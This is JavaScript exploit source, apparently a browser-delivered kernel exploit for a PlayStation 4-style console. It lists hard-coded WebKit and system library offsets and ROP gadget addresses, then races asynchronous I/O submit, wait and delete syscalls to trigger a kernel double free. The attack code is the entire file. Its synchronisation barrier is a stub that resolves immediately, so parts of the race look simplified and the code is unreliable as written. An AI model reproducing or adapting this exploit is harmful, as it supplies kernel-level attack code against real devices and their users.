 const OFFSET_wk_vtable_first_element = 0x104F110; const OFFSET_WK_memset_import = 0x000002A8; const OFFSET_WK___stack_chk_fail_import = 0x00000178; const OFFSET_WK_psl_builtin_import = 0xD68; const OFFSET_WKR_psl_builtin = 0x33BA0; const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7; const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3; const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7; const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3; const OFFSET_libcint_memset = 0x0004F810; const OFFSET_libcint_setjmp = 0x000BB5BC; const OFFSET_libcint_longjmp = 0x000BB616; const OFFSET_WK2_TLS_IMAGE = 0x38e8020; const OFFSET_lk___stack_chk_fail = 0x0001FF60; const OFFSET_lk_pthread_create = 0x00025510; const OFFSET_lk_pthread_join = 0x0000AFA0; var chain, kchain, kchain2; var SAVED_KERNEL_STACK_PTR, KERNEL_BASE_PTR; var webKitBase, webKitRequirementBase; var libSceLibcInternalBase, libKernelBase; var textArea = document.createElement("textarea"); var nogc = [], syscalls = {}, gadgets = {}; function kernelExploit() { const SCE_KERNEL_AIO_CMD_READ = 0x001; const SCE_KERNEL_AIO_CMD_WRITE = 0x002; const SCE_KERNEL_AIO_CMD_MASK = 0xfff; const SCE_KERNEL_AIO_CMD_MULTI = 0x1000; const SCE_KERNEL_AIO_PRIORITY_LOW = 1; const SCE_KERNEL_AIO_PRIORITY_MID = 2; const SCE_KERNEL_AIO_PRIORITY_HIGH = 3; const num_reqs = 3; const which_req = 0; const structSize = 0x28; let reqsPtr = p.malloc(num_reqs * structSize); let idsPtr = p.malloc32(num_reqs); let errsPtr = p.malloc32(num_reqs); let race1Ptr = p.malloc32(1); let race2Ptr = p.malloc32(1); idsPtr.backing.fill(0); errsPtr.backing.fill(0); race1Ptr.backing[0] = 0; race2Ptr.backing[0] = 0; for (let i = 0; i < num_reqs; i++) { p.write4(reqsPtr.add32(i * structSize + 0x20), -1); } function createBarrier(cnt) { return { wait: () => Promise.resolve() }; } let barrier = createBarrier(2); function aio_submit_cmd(cmd, reqs, n, prio, ids) { return chain.fcall( window.syscalls[669], cmd, reqs, n, prio, ids ); } function aio_multi_wait(ids, n, errs, mode, usec) { return chain.fcall( window.syscalls[663], ids, n, errs, mode, usec ); } function aio_multi_delete(ids, n, errs) { return chain.fcall( window.syscalls[662], ids, n, errs ); } (async () => { for (let iter = 0; iter < 100; iter++) { aio_submit_cmd( SCE_KERNEL_AIO_CMD_WRITE | SCE_KERNEL_AIO_CMD_MULTI, reqsPtr, num_reqs, SCE_KERNEL_AIO_PRIORITY_HIGH, idsPtr ); aio_multi_wait(idsPtr, num_reqs, errsPtr, 0x01, 0); let race = (async () => { await barrier.wait(); aio_multi_delete( idsPtr.add32(which_req * 4), 1, race2Ptr ); })(); await barrier.wait(); aio_multi_delete( idsPtr.add32(which_req * 4), 1, race1Ptr ); await race; if (race1Ptr.backing[0] === race2Ptr.backing[0]) { alert("Double Free achieved!"); return; } } alert("Double Free failed"); })(); } function runKEX() { kernelExploit(); } runKEX();

